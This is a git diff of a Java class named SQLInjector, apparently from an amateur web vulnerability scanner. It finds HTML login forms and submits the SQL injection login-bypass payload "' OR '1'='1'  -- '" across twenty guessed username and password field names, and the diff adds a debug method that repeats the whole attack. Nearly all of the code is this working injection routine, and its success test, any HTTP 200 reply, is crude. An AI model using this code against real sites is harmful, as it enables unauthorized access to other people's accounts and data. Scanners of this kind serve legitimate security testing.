@@ -50,7 +50,8 @@ public class SQLInjector {
         boolean result = false;
 
         for (Link l : linkStore.getStore().values()) {
-            result = test(l);
+            result = testOneEqualToOne(l);
+            result = testRegisterUnion(l);
         }
         return result;
     }
@@ -82,22 +83,21 @@ public class SQLInjector {
                 con.data(e.attr("name"), e.attr("value"));
             }
 
-            if (form.getElementsByAttributeValue("type", "password") != null) {  //it means the form is a login form.. ;)
-                return testLogin(link);
+            if (form.getElementsByAttributeValue("type", "password").first() != null) {  //it means the form is a login form.. ;)
+                return testOneEqualToOne(link);
             } else {// its a registration form..
 
                 boolean result = testRegisterUnion(link);
-
+                
+                return result;
             }
-
         } catch (Exception ex) {
             ex.printStackTrace();
         }
-
         return false;
     }
 
-    public boolean testLogin(Link link) {
+    public boolean testOneEqualToOne(Link link) {
 
         try {
 
@@ -125,64 +125,64 @@ public class SQLInjector {
 
             //20 combinations of username password..
             //<editor-fold>
-            if ((form.getElementsByAttributeValue("name", "username") != null) && (form.getElementsByAttributeValue("name", "password") != null)) {
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                 con = con.data("username", "' OR '1'='1'  -- '", "password", "");
             }
-            if ((form.getElementsByAttributeValue("name", "username") != null) && (form.getElementsByAttributeValue("name", "passwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                 con = con.data("username", "' OR '1'='1'  -- '", "passwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "username") != null) && (form.getElementsByAttributeValue("name", "pass") != null)) {
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                 con = con.data("username", "' OR '1'='1'  -- '", "pass", "");
             }
-            if ((form.getElementsByAttributeValue("name", "username") != null) && (form.getElementsByAttributeValue("name", "pwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                 con = con.data("username", "' OR '1'='1'  -- '", "pwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "usernm") != null) && (form.getElementsByAttributeValue("name", "password") != null)) {
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                 con = con.data("usernm", "' OR '1'='1'  -- '", "password", "");
             }
-            if ((form.getElementsByAttributeValue("name", "usernm") != null) && (form.getElementsByAttributeValue("name", "passwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                 con = con.data("usernm", "' OR '1'='1'  -- '", "passwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "usernm") != null) && (form.getElementsByAttributeValue("name", "pass") != null)) {
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                 con = con.data("usernm", "' OR '1'='1'  -- '", "pass", "");
             }
-            if ((form.getElementsByAttributeValue("name", "usernm") != null) && (form.getElementsByAttributeValue("name", "pwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                 con = con.data("usernm", "' OR '1'='1'  -- '", "pwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "uname") != null) && (form.getElementsByAttributeValue("name", "password") != null)) {
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                 con = con.data("uname", "' OR '1'='1'  -- '", "password", "");
             }
-            if ((form.getElementsByAttributeValue("name", "uname") != null) && (form.getElementsByAttributeValue("name", "passwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                 con = con.data("uname", "' OR '1'='1'  -- '", "passwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "uname") != null) && (form.getElementsByAttributeValue("name", "pass") != null)) {
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                 con = con.data("uname", "' OR '1'='1'  -- '", "pass", "");
             }
-            if ((form.getElementsByAttributeValue("name", "uname") != null) && (form.getElementsByAttributeValue("name", "pwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                 con = con.data("uname", "' OR '1'='1'  -- '", "pwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "user") != null) && (form.getElementsByAttributeValue("name", "password") != null)) {
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                 con = con.data("user", "' OR '1'='1'  -- '", "password", "");
             }
-            if ((form.getElementsByAttributeValue("name", "user") != null) && (form.getElementsByAttributeValue("name", "passwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                 con = con.data("user", "' OR '1'='1'  -- '", "passwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "user") != null) && (form.getElementsByAttributeValue("name", "pass") != null)) {
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                 con = con.data("user", "' OR '1'='1'  -- '", "pass", "");
             }
-            if ((form.getElementsByAttributeValue("name", "user") != null) && (form.getElementsByAttributeValue("name", "pwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                 con = con.data("user", "' OR '1'='1'  -- '", "pwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "unm") != null) && (form.getElementsByAttributeValue("name", "password") != null)) {
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
                 con = con.data("unm", "' OR '1'='1'  -- '", "password", "");
             }
-            if ((form.getElementsByAttributeValue("name", "unm") != null) && (form.getElementsByAttributeValue("name", "passwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
                 con = con.data("unm", "' OR '1'='1'  -- '", "passwd", "");
             }
-            if ((form.getElementsByAttributeValue("name", "unm") != null) && (form.getElementsByAttributeValue("name", "pass") != null)) {
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
                 con = con.data("unm", "' OR '1'='1'  -- '", "pass", "");
             }
-            if ((form.getElementsByAttributeValue("name", "unm") != null) && (form.getElementsByAttributeValue("name", "pwd") != null)) {
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
                 con = con.data("unm", "' OR '1'='1'  -- '", "pwd", "");
             }
             //</editor-fold>
@@ -202,6 +202,7 @@ public class SQLInjector {
                     break;
                 default:
                     r.setReport(r.getReport() + "OR 1=1 SQL Injection Unsuccessful.");
+                    System.out.println(":(");
                     break;
             }
             int index = this.Report.indexOf(r);
@@ -324,5 +325,135 @@ public class SQLInjector {
         }
 
         return false;
+    }
+    
+    
+    
+    public void dummmy(Link link){//ignore this method,, just a dummy method to debug..
+        try {
+
+            Document doc = Jsoup.connect(link.getURL()).get();
+            Elements forms = doc.select("form[action]");
+
+            Element form = forms.first();
+            Elements textboxes = form.getElementsByAttributeValue("type", "text");
+            Elements hidden = form.select("input[type=hidden]");
+            String submitURL = form.attr("abs:action");
+
+            HttpConnection.Response res = null;
+            int statusCode;
+            Document responseDoc = null;
+
+            Report r = new Report(link.getID());
+            r.setReport(" ");
+
+            Connection con = Jsoup.connect(submitURL).ignoreContentType(true).ignoreHttpErrors(true);
+
+            for (Element e : hidden) {
+                con.data(e.attr("name"), e.attr("value"));
+            }
+
+            Element tempUElement=null,tempPElement=null;
+
+            //20 combinations of username password..
+            //<editor-fold>
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
+                con = con.data("username", "' OR '1'='1'  -- '", "password", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
+                con = con.data("username", "' OR '1'='1'  -- '", "passwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
+                con = con.data("username", "' OR '1'='1'  -- '", "pass", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "username").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
+                con = con.data("username", "' OR '1'='1'  -- '", "pwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
+                con = con.data("usernm", "' OR '1'='1'  -- '", "password", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
+                con = con.data("usernm", "' OR '1'='1'  -- '", "passwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
+                con = con.data("usernm", "' OR '1'='1'  -- '", "pass", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "usernm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
+                con = con.data("usernm", "' OR '1'='1'  -- '", "pwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
+                con = con.data("uname", "' OR '1'='1'  -- '", "password", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
+                con = con.data("uname", "' OR '1'='1'  -- '", "passwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
+                con = con.data("uname", "' OR '1'='1'  -- '", "pass", "");
+                System.out.println(form.getElementsByAttributeValue("name", "uname").first().text());
+                System.out.println(form.getElementsByAttributeValue("name", "pass").first().text());
+                
+            }
+            if ((form.getElementsByAttributeValue("name", "uname").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
+                con = con.data("uname", "' OR '1'='1'  -- '", "pwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
+                con = con.data("user", "' OR '1'='1'  -- '", "password", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
+                con = con.data("user", "' OR '1'='1'  -- '", "passwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
+                con = con.data("user", "' OR '1'='1'  -- '", "pass", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "user").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
+                con = con.data("user", "' OR '1'='1'  -- '", "pwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "password").first() != null)) {
+                con = con.data("unm", "' OR '1'='1'  -- '", "password", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "passwd").first() != null)) {
+                con = con.data("unm", "' OR '1'='1'  -- '", "passwd", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pass").first() != null)) {
+                con = con.data("unm", "' OR '1'='1'  -- '", "pass", "");
+            }
+            if ((form.getElementsByAttributeValue("name", "unm").first() != null) && (form.getElementsByAttributeValue("name", "pwd").first() != null)) {
+                con = con.data("unm", "' OR '1'='1'  -- '", "pwd", "");
+            }
+            //</editor-fold>
+
+            //dropping the idea of regex username password and sticking to 20 combinations we thought of; for the time being.
+            //String Uregex="[t[e]xt][u][s][e][r]n[a]m[e]{3,12}";
+            //String Pregex="[t[e]xt]p[a][s][s][w][o][r][d]{3,12}";
+
+
+            res = (HttpConnection.Response) con.execute();
+
+            statusCode = res.statusCode();
+            switch (statusCode) {
+                case 200:
+                    r.setReport(r.getReport() + "OR 1=1 SQL Injection Successful.");
+                    System.out.println("yippee !");
+                    break;
+                default:
+                    r.setReport(r.getReport() + "OR 1=1 SQL Injection Unsuccessful.");
+                    System.out.println(":(");
+                    break;
+            }
+            int index = this.Report.indexOf(r);
+            if (index >= 0) {
+                this.Report.get(index).setReport(r.getReport());
+            } else {
+                this.Report.add(r);
+            }
+
+            System.out.println("Status Code : " + statusCode);
+            //System.out.println(responseDoc.toString());
+
+            //return (statusCode == 200 ? true : false);
+
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
     }
 }
